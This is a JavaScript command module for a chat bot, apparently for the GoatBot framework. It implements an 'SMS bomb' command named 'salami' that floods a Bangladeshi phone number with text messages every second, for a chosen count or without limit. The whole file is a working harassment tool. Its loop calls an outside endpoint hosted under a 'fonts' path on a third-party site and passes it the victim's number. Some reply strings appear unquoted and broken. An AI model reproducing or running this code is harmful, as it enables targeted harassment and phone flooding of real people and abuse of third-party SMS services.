const axios = require("axios");
const bombingFlags = {};
const deltaNext = 5;

function expToLevel(exp) {
return Math.floor((1 + Math.sqrt(1 + 8 * exp / deltaNext)) / 2);
}

module.exports = {
config: {
name: "salami",
version: "4.0",
author: "Rahad",
countDown: 0,
role: 3,
shortDescription: { en: "Send SMS bomb" },
description: { en: "SMS bombing every second (custom count or unlimited) with design" },
category: "tools",
guide: {
en: "salami 01xxxxxxxxx [count/unlimited]\nExample: salami 017xxxxxxxx 100\nExample: salami 017xxxxxxxx unlimited\nExample: salami off"
}
},

onStart: async function ({ event, message, args, usersData }) {
const threadID = event.threadID;
const senderID = event.senderID;
const number = args[0];
const countArg = args[1];

if (!number) {  
  return message.reply(

╔═══❖•𝐒𝐀𝐋𝐀𝐌𝐈•❖═══╗   📌 Usage:   salami 01xxxxxxxxx [count/unlimited]   salami off → stop bombing   ╚════════════════╝
);
}

const userData = await usersData.get(senderID);  
const exp = userData.exp || 0;  
const level = expToLevel(exp);  
if (level < 2) {  
  return message.reply("🚫 You must be at least level 2 to use this command!");  
}  

if (number.toLowerCase() === "off") {  
  if (bombingFlags[threadID]) {  
    bombingFlags[threadID] = false;  
    return message.reply(

╔═══❖•𝐒𝐀𝐋𝐀𝐌𝐈•❖═══╗   ✅ SMS bombing stopped.   ╚═══🔥•ℝ𝕒𝕙𝕒𝕕 𝔹𝕠𝕤𝕤•🔥═══╝
);
} else {
return message.reply("❗No active bombing in this thread.");
}
}

if (!/^01[0-9]{9}$/.test(number)) {  
  return message.reply("📱 Please provide a valid Bangladeshi number!\n👉 Example: salami 01xxxxxxxxx 100");  
}  

if (bombingFlags[threadID]) {  
  return message.reply("❗Bombing already in progress! To stop, type: salami off");  
}  

let maxSMS = Infinity;  
if (countArg && countArg.toLowerCase() !== "unlimited") {  
  const parsed = parseInt(countArg);  
  if (!isNaN(parsed) && parsed > 0) {  
    maxSMS = parsed;  
  } else {  
    return message.reply("❌ Invalid count! Please provide a number or 'unlimited'.");  
  }  
}  

if (maxSMS === Infinity) {  
  message.reply(

╔═══❖•𝐒𝐀𝐋𝐀𝐌𝐈•❖═══╗   💥 Target: ${number}   ⚡ Mode: Unlimited   ⏱ Speed: 1s / SMS   🛑 Stop: salami off   ╚═══🔥•ℝ𝕒𝕙𝕒𝕕 𝔹𝕠𝕤𝕤•🔥═══╝
);
} else {
message.reply(
╔═══❖•𝐒𝐀𝐋𝐀𝐌𝐈•❖═══╗   💥 Target: ${number}   📤 Total: ${maxSMS} SMS   ⏱ Speed: 1s / SMS   🛑 Stop: salami off   ╚═══🔥•ℝ𝕒𝕙𝕒𝕕 𝔹𝕠𝕤𝕤•🔥═══╝
);
}

bombingFlags[threadID] = true;  
let count = 0;  

async function sendBomb() {  
  if (!bombingFlags[threadID]) return;  

  if (count >= maxSMS) {  
    bombingFlags[threadID] = false;  
    return message.reply(

╔═══❖•𝐒𝐀𝐋𝐀𝐌𝐈•❖═══╗   ✅ Sent ${count} SMS to ${number}.   💤 Bombing stopped automatically.   ╚═══🔥•ℝ𝕒𝕙𝕒𝕕 𝔹𝕠𝕤𝕤•🔥═══╝
);
}

try {  
    await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);  
    count++;  
    console.log(`SMS ${count}/${maxSMS === Infinity ? "∞" : maxSMS} sent to ${number}`);  
  } catch (err) {  
    message.reply(`❌ Error: ${err.message}`);  
    bombingFlags[threadID] = false;  
    return;  
  }  
  setTimeout(sendBomb, 1000); // প্রতি ১ সেকেন্ডে পাঠাবে  
}  

sendBomb();

}
};

